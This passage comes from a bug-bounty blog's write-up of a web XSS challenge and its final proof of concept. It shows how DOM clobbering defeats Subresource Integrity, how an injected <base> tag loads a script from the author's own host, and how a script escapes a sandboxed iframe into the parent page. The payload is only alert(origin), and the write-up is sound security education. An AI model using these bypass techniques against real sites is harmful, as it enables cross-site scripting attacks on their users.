                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_integrity.png" alt="CSP" /></p>

<p>The <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> element is created with an <code class="language-plaintext highlighter-rouge">integrity</code> attribute. It’s a feature
known as “Sub-resource Integrity” that instructs the browser to check that the
signature of the downloaded script matches the signatures declared in the
attribute.</p>

<p>Since we don’t have any way to make our script’s sha256 match the expected
value of <code class="language-plaintext highlighter-rouge">unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=</code>, we need to a way to
change this expected value. Where does this value come from? It is set with the
following piece of code:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">fileIntegrity</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">fileIntegrity</span> <span class="o">||</span> <span class="p">{</span>
    <span class="dl">'</span><span class="s1">rfc</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1"> https://w3c.github.io/webappsec-subresource-integrity/</span><span class="dl">'</span><span class="p">,</span>
    <span class="dl">'</span><span class="s1">algorithm</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">,</span>
    <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=</span><span class="dl">'</span><span class="p">,</span>
    <span class="dl">'</span><span class="s1">creationtime</span><span class="dl">'</span> <span class="p">:</span> <span class="mi">1602687229</span>
<span class="p">}</span>
<span class="p">[...]</span>
<span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">integrity</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">sha256-</span><span class="dl">'</span><span class="o">+</span><span class="nx">fileIntegrity</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
</code></pre></div></div>

<p>If <code class="language-plaintext highlighter-rouge">window.fileIntegrity</code> is already set when the script executes, it won’t be
overridden. But how could we set it without an XSS? Through DOM Clobbering!
Since we can inject arbitrary tags, we can inject an <code class="language-plaintext highlighter-rouge">&lt;input&gt;</code> tag:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"fileIntegrity"</span> <span class="na">value=</span><span class="s">"&lt;our_sha256&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>It will have the effect of setting <code class="language-plaintext highlighter-rouge">fileIntegrity.value</code> to the sha256 of our
malicious <code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file.</p>

<h3 id="modal-block-bypass">Modal Block Bypass</h3>

<p>Let’s create our file
<code class="language-plaintext highlighter-rouge">https://acut3.xyz/files/analytics/js/frame-analytics.js</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -gsi 'https://acut3.xyz/files/analytics/js/frame-analytics.js'
HTTP/2 200
[...]
access-control-allow-origin: *
content-type: application/javascript

alert(origin)
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -s 'https://acut3.xyz/files/analytics/js/frame-analytics.js' \
       | openssl sha256 -binary | base64
5gW1KquRtb9p81d6nfzjy+RXY/+o5QNprR3LJ4hhyMM=
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
        <span class="dl">'</span><span class="s1">&lt;/title&gt;</span><span class="dl">'</span>
        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;script&gt;alert(origin)&lt;/script&gt;</span><span class="dl">'</span>
        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;input hidden id="22fileIntegrity" value="5gW1KquRtb9p81d6nfzjy+RXY/+o5QNprR3LJ4hhyMM="&gt;</span><span class="dl">'</span>
    <span class="p">);</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We’re faced with yet another issue:</p>

<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_modal.png" alt="CSP" /></p>

<p>Because our XSS is executing inside a sandboxed iframe that doesn’t have
<code class="language-plaintext highlighter-rouge">allow-modals</code> option, we’re not allowed call <code class="language-plaintext highlighter-rouge">alert()</code>.</p>

<p>Instead of calling <code class="language-plaintext highlighter-rouge">alert()</code> inside the sandboxed iframe, we can inject a
script into the parent window. This is allowed because the sandboxed iframe has
the <code class="language-plaintext highlighter-rouge">allow-same-origin</code> option set, which means it has its normal origin
(without it, it would have a special origin that doesn’t match any other
origin). In this case the origin is the same as the parent window since the
iframe doesn’t have an <code class="language-plaintext highlighter-rouge">src</code> attribute.</p>

<p>Our <code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file becomes:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xss</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">xss</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">alert(origin)</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">xss</span><span class="p">);</span>
</code></pre></div></div>

<p>Note that we don’t need to set a nonce, presumably because the script is being
created by a “trusted” script. But if needed it would be easy to set a valid
nonce with:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xss</span><span class="p">.</span><span class="nx">nonce</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">scripts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">nonce</span>
</code></pre></div></div>

<h3 id="final-poc">Final PoC</h3>

<p>We simply need to host those two web pages:</p>

<ol>
  <li>
    <p>https://acut3.xyz/files/analytics/js/frame-analytics.js:</p>

    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xss</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">xss</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">alert(origin)</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">xss</span><span class="p">);</span>
</code></pre></div>    </div>

    <p>Returned with the required header:</p>

    <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">Access-Control-Allow-Origin: *
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>The main page:</p>

    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
        <span class="dl">'</span><span class="s1">&lt;/title&gt;</span><span class="dl">'</span>
        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;base href="https://acut3.xyz/"&gt;</span><span class="dl">'</span>
        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;input hidden id="fileIntegrity" value="8rWlnRQdot2DeuCE0IKb7kw4BhGMRbQeOITSE876IQs="&gt;</span><span class="dl">'</span>
    <span class="p">);</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// Sets name to "iframe" in the new window</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"popup()"</span><span class="nt">&gt;</span>Click me!<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>The victim needs to visit our page and click on the “Click me!” link. An alert
will pop in the new tab.</p>

<h2 id="bugpoc-poc">BugPoC PoC</h2>

<p>First we need to create a <a href="https://bugpoc.com/testers/other/mock">mock
endpoint</a> that will return the fake
<code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file:</p>

<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_other_mock.png" alt="Mock Endpoint Builder" /></p>

<p>The <a href="https://mock.bugpoc.ninja/bf96c4ce-ab42-4d47-aa3e-4d45d70ae2d9/m?sig=1d02918cec44299d3fc73268614e9cb5fe2d8243d3bce1a894b886e4d6d77948&amp;statusCode=200&amp;headers=%7B%22access-control-allow-origin%22%3A%22*%22%7D&amp;body=xss%20%3D%20document.createElement(%22script%22)%3B%0Axss.textContent%20%3D%20%22alert(origin)%22%3B%0Aparent.document.body.appendChild(xss)%3B">generated URL</a> cannot be used as a <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code> URL since it ends with a non-directory element. Let’s use the new <a href="https://bugpoc.com/testers/other/redir">flexible redirector</a> to hide it behind a clean, <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code>-friendly URL:</p>

<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_other_redir.png" alt="Flexible Redirector" /></p>

<p>Compute the sha256 of this page (don’t forget curl’s <code class="language-plaintext highlighter-rouge">-L</code> to follow
redirections):</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-Ls</span> <span class="s1">'https://zkkmxeqw4y9n.redir.bugpoc.ninja'</span> <span class="se">\</span>
       | openssl sha256 <span class="nt">-binary</span> | <span class="nb">base64
</span>uab6g00HfZC79E8L0usyN5QQ01OnnzuP+RYY1jUfu7o<span class="o">=</span>
</code></pre></div></div>

<p>Now the generated URL
<a href="https://zkkmxeqw4y9n.redir.bugpoc.ninja">https://zkkmxeqw4y9n.redir.bugpoc.ninja</a>
can be used to build the final <a href="https://bugpoc.com/testers/front-end">Front-End
PoC</a>:</p>

<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_front-end.png" alt="Front-End PoC Generator" /></p>

<p>Click on “Publish” and share the <a href="https://bugpoc.com/poc#bp-lMrf4j3L">PoC URL</a>
and password in you HackerOne report:</p>

<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_published.png" alt="Front-End PoC Published" /></p>

<h2 id="final-thoughts">Final thoughts</h2>

<p>I must say I enjoyed this challenge very much. It had all the attributes that,
in my opinion, make a good challenge:</p>

<ul>
  <li>No guesswork, just logical thinking</li>
  <li>Realistic vulnerabilities that you could find in a real world scenario</li>
  <li>Some lesser knows techniques that I’m sure were new to many participants</li>
</ul>

<p>To summarize the different techniques that we used:</p>

<ul>
  <li>Use <code class="language-plaintext highlighter-rouge">open()</code> when iframing is not possible</li>
  <li>Inject a <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code> tag to replace an existing script and bypass a nonce</li>
  <li>Use DOM Clobbering to set a variable and alter the flow of an an existing
script</li>
  <li>Once you have an XSS, everything with the same origin is in reach</li>
</ul>

<p>Also something quite unique about this challenge: it serves as the first
interview for select Amazon Security Engineering roles, should you choose to
apply for them. Pretty cool! While I’m not personally looking for a job, I hope
others will have seized the opportunity and that something good will come out
of it.</p>

<hr />
</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2020-11-10T00:00:00+01:00"><!-- start custom article footer snippet -->

<!-- end custom article footer snippet -->
<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
</div><div class="article__license"><div class="license">
    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by/4.0/">Attribution 4.0 International</a> license.
      <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
        <img alt="Attribution 4.0 International" src="https://i.creativecommons.org/l/by/4.0/88x31.png" />
      </a>
    </p>
  </div></div></footer>
<div class="article__section-navigator clearfix"><div class="next"><span>NEXT</span><a href="/ctf/2020/12/13/intigriti-december-xss-challenge.html">Intigrity December XSS Challenge</a></div></div></div>

</div>

<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    $(function() {
      var $this ,$scroll;
      var $articleContent = $('.js-article-content');
      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
      $scroll = $(scroll);

      $articleContent.find('.highlight').each(function() {
        $this = $(this);
        $this.attr('data-lang', $this.find('code').attr('data-lang'));
      });
      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
        $this = $(this);
        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
      });
      $articleContent.on('click', '.anchor', function() {
        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
      });
    });
  });
})();
</script>
</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->

<!-- end custom main bottom snippet -->
</div>
            </div></div></div><div class="page__footer d-print-none">
<footer class="footer py-4 js-page-footer">
  <div class="main"><div itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="acut3"><meta itemprop="url" content="/"><meta itemprop="description" content="Bug Bounty Hunter"><div class="footer__author-links"><div class="author-links">
  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Twitter.">
        <a class="button button--circle twitter-button" itemprop="sameAs" rel="me" href="https://infosec.exchange/@acut3hack" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M1024.032 194.432c-37.664 16.704-78.176 28-120.672 33.088 43.36-26.016 76.672-67.168 92.384-116.224-40.608 24.064-85.568 41.568-133.408 50.976-38.336-40.832-92.928-66.336-153.344-66.336-116.032 0-210.08 94.048-210.08 210.08 0 16.48 1.856 32.512 5.44 47.872-174.592-8.768-329.408-92.416-433.024-219.52-18.08 31.04-28.448 67.104-28.448 105.632 0 72.896 37.088 137.184 93.472 174.88-34.432-1.088-66.816-10.528-95.168-26.272-0.032 0.864-0.032 1.76-0.032 2.656 0 101.792 72.416 186.688 168.512 205.984-17.632 4.8-36.192 7.36-55.36 7.36-13.536 0-26.688-1.312-39.52-3.776 26.72 83.456 104.32 144.192 196.256 145.888-71.904 56.352-162.496 89.92-260.928 89.92-16.96 0-33.664-0.992-50.112-2.944 92.96 59.616 203.392 94.4 322.048 94.4 386.432 0 597.728-320.128 597.728-597.76 0-9.12-0.192-18.176-0.608-27.168 41.056-29.632 76.672-66.624 104.832-108.736z" />
</svg>
</div>
        </a>
      </li><li title="Follow me on Linkedin.">
        <a class="button button--circle linkedin-button" itemprop="sameAs" href="https://www.linkedin.com/in/nicolas-christin-60a377a9" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M260.096 155.648c0 27.307008-9.899008 50.516992-29.696 69.632-19.796992 19.115008-45.396992 28.672-76.8 28.672-30.036992 0-54.612992-9.556992-73.728-28.672-19.115008-19.115008-28.672-42.324992-28.672-69.632 0-28.672 9.556992-52.224 28.672-70.656 19.115008-18.432 44.372992-27.648 75.776-27.648 31.403008 0 56.32 9.216 74.752 27.648 18.432 18.432 28.331008 41.984 29.696 70.656 0 0 0 0 0 0m-202.752 808.96c0 0 0-632.832 0-632.832 0 0 196.608 0 196.608 0 0 0 0 632.832 0 632.832 0 0-196.608 0-196.608 0 0 0 0 0 0 0m313.344-430.08c0-58.708992-1.364992-126.292992-4.096-202.752 0 0 169.984 0 169.984 0 0 0 10.24 88.064 10.24 88.064 0 0 4.096 0 4.096 0 40.96-68.267008 105.812992-102.4 194.56-102.4 68.267008 0 123.220992 22.868992 164.864 68.608 41.643008 45.739008 62.464 113.664 62.464 203.776 0 0 0 374.784 0 374.784 0 0-196.608 0-196.608 0 0 0 0-350.208 0-350.208 0-91.476992-33.451008-137.216-100.352-137.216-47.787008 0-81.236992 24.576-100.352 73.728-4.096 8.192-6.144 24.576-6.144 49.152 0 0 0 364.544 0 364.544 0 0-198.656 0-198.656 0 0 0 0-430.08 0-430.08 0 0 0 0 0 0" />
</svg>
</div>
        </a>
      </li><li title="Follow me on Github.">
        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/acut3" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
</svg>
</div>
        </a>
      </li></ul>
</div>
</div>
    </div><div class="site-info mt-2">
      <div>© acut3 2020,
        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
      </div>
    </div>
  </div>
</footer>
</div></div>
    </div><script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $body = $('body'), $window = $(window);
    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
    var activeCount = 0;
    function modal(options) {
      var $root = this, visible, onChange, hideWhenWindowScroll = false;
      var scrollTop;
      function setOptions(options) {
        var _options = options || {};
        visible = _options.initialVisible === undefined ? false : show;
        onChange = _options.onChange;
        hideWhenWindowScroll = _options.hideWhenWindowScroll;
      }
      function init() {
        setState(visible);
      }
      function setState(isShow) {
        if (isShow === visible) {
          return;
        }
        visible = isShow;
        if (visible) {
          activeCount++;
          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
          $root.addClass('modal--show');
          $pageMain.scrollTop(scrollTop);
          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
          $window.on('keyup', handleKeyup);
        } else {
          activeCount > 0 && activeCount--;
          $root.removeClass('modal--show');
          $window.scrollTop(scrollTop);
          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
          $window.off('keyup', handleKeyup);
        }
        onChange && onChange(visible);
      }
      function show() {
        setState(true);
      }
      function hide() {
        setState(false);
      }
      function handleKeyup(e) {
        // Char Code: 27  ESC
        if (e.which ===  27) {
          hide();
        }
      }
      setOptions(options);
      init();
      return {
        show: show,
        hide: hide,
        $el: $root
      };
    }
    $.fn.modal = modal;
  });
})();
</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
(function () {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    // search panel
    var search = (window.search || (window.search = {}));
    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
      true : window.useDefaultSearchBox ;

    var $searchModal = $('.js-page-search-modal');
    var $searchToggle = $('.js-search-toggle');
    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
    var modalVisible = false;
    search.searchModal = searchModal;

    var $searchBox = null;
    var $searchInput = null;
    var $searchClear = null;

    function getModalVisible() {
      return modalVisible;
    }
    search.getModalVisible = getModalVisible;

    function handleModalChange(visible) {
      modalVisible = visible;
      if (visible) {
        search.onShow && search.onShow();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
      } else {
        search.onShow && search.onHide();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
        setTimeout(function() {
          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
          search.clear && search.clear();
          window.pageAsideAffix && window.pageAsideAffix.refresh();
        }, 400);
      }
    }

    $searchToggle.on('click', function() {
      modalVisible ? searchModal.hide() : searchModal.show();
    });
    // Char Code: 83  S, 191 /
    $(window).on('keyup', function(e) {
      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
        modalVisible || searchModal.show();
      }
    });

    if (useDefaultSearchBox) {
      $searchBox = $('.js-search-box');
      $searchInput = $searchBox.children('input');
      $searchClear = $searchBox.children('.js-icon-clear');
      search.getSearchInput = function() {
        return $searchInput.get(0);
      };
      search.getVal = function() {
        return $searchInput.val();
      };
      search.setVal = function(val) {
        $searchInput.val(val);
      };

      $searchInput.on('focus', function() {
        $(this).addClass('focus');
      });
      $searchInput.on('blur', function() {
        $(this).removeClass('focus');
      });
      $searchInput.on('input', window.throttle(function() {
        var val = $(this).val();
        if (val === '' || typeof val !== 'string') {
          search.clear && search.clear();
        } else {
          $searchBox.addClass('not-empty');
          search.onInputNotEmpty && search.onInputNotEmpty(val);
        }
      }, 400));
      $searchClear.on('click', function() {
        $searchInput.val(''); $searchBox.removeClass('not-empty');
        search.clear && search.clear();
      });
    }
  });
})();
</script><div class="search search--dark">
  <div class="main">
    <div class="search__header">Search</div>
    <div class="search-bar">
      <div class="search-box js-search-box">
        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
        <input type="text" />
        <div class="search-box__icon-clear js-icon-clear">
          <a><i class="fas fa-times"></i></a>
        </div>
      </div>
      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
        Cancel</button>
    </div>
    <div class="search-result js-search-result"></div>
  </div>
</div>
<script>var SOURCES = window.TEXT_VARIABLES.sources;
var PAHTS = window.TEXT_VARIABLES.paths;
window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
  var search = (window.search || (window.search = {}));
  var searchData = window.TEXT_SEARCH_DATA || {};

  function memorize(f) {
    var cache = {};
    return function () {
      var key = Array.prototype.join.call(arguments, ',');
      if (key in cache) return cache[key];
      else return cache[key] = f.apply(this, arguments);
    };
  }

  /// search
  function searchByQuery(query) {
    var i, j, key, keys, cur, _title, result = {};
    keys = Object.keys(searchData);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      for (j = 0; j < searchData[key].length; j++) {
        cur = searchData[key][j], _title = cur.title;
        if ((result[key] === undefined || result[key] && result[key].length < 4 )
          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
          if (result[key] === undefined) {
            result[key] = [];
          }
          result[key].push(cur);
        }
      }
    }
    return result;
  }

  var renderHeader = memorize(function(header) {
    return $('<p class="search-result__header">' + header + '</p>');
  });

  var renderItem = function(index, title, url) {
    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
  };

  function render(data) {
    if (!data) { return null; }
    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
    keys = Object.keys(data);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      $root.append(renderHeader(key));
      for (j = 0; j < data[key].length; j++) {
        cur = data[key][j];
        $root.append(renderItem(itemIndex++, cur.title, cur.url));
      }
    }
    return $root;
  }

  // search box
  var $result = $('.js-search-result'), $resultItems;
  var lastActiveIndex, activeIndex;

  function clear() {
    $result.html(null);
    $resultItems = $('.search-result__item'); activeIndex = 0;
  }
  function onInputNotEmpty(val) {
    $result.html(render(searchByQuery(val)));
    $resultItems = $('.search-result__item'); activeIndex = 0;
    $resultItems.eq(0).addClass('active');
  }

  search.clear = clear;
  search.onInputNotEmpty = onInputNotEmpty;

  function updateResultItems() {
    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
  }

  function moveActiveIndex(direction) {
    var itemsCount = $resultItems ? $resultItems.length : 0;
    if (itemsCount > 1) {
      lastActiveIndex = activeIndex;
      if (direction === 'up') {
        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
      } else if (direction === 'down') {
        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
      }
      updateResultItems();
    }
  }

  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
  $(window).on('keyup', function(e) {
    var modalVisible = search.getModalVisible && search.getModalVisible();
    if (modalVisible) {
      if (e.which === 38) {
        modalVisible && moveActiveIndex('up');
      } else if (e.which === 40) {
        modalVisible && moveActiveIndex('down');
      } else if (e.which === 13) {
        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
      }
    }
  });

  $result.on('mouseover', '.search-result__item > a', function() {
    var itemIndex = $(this).parent().data('index');
    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
  });
});
</script>
</div></div>


<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function scrollToAnchor(anchor, duration, callback) {
      var $root = this;
      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
        callback && callback();
      });
    }
    $.fn.scrollToAnchor = scrollToAnchor;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function affix(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroll,
        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
        hasInit = false, curState;

      function setOptions(options) {
        var _options = options || {};
        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroll && (scroll = _options.scroll);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $scrollTarget = $(scrollTarget);
        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
        $scroll = $(scroll);
      }
      function preCalc() {
        top();
        rootHeight = $root.outerHeight();
        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
        rootLeft = $root.offset().left;
      }
      function calc(needPreCalc) {
        needPreCalc && preCalc();
        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
        rootBottomTop = scrollBottom - rootTop;
      }
      function top() {
        if (curState !== 'top') {
          $root.removeClass('fixed').css({
            left: 0,
            top: 0
          });
          curState = 'top';
        }
      }
      function fixed() {
        if (curState !== 'fixed') {
          $root.addClass('fixed').css({
            left: rootLeft + 'px',
            top: 0
          });
          curState = 'fixed';
        }
      }
      function bottom() {
        if (curState !== 'bottom') {
          $root.removeClass('fixed').css({
            left: 0,
            top: rootBottomTop + 'px'
          });
          curState = 'bottom';
        }
      }
      function setState() {
        var scrollTop = $scrollTarget.scrollTop();
        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
          fixed();
        } else if (scrollTop < rootTop) {
          top();
        } else {
          bottom();
        }
      }
      function init() {
        if(!hasInit) {
          var interval, timeout;
          calc(true); setState();
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
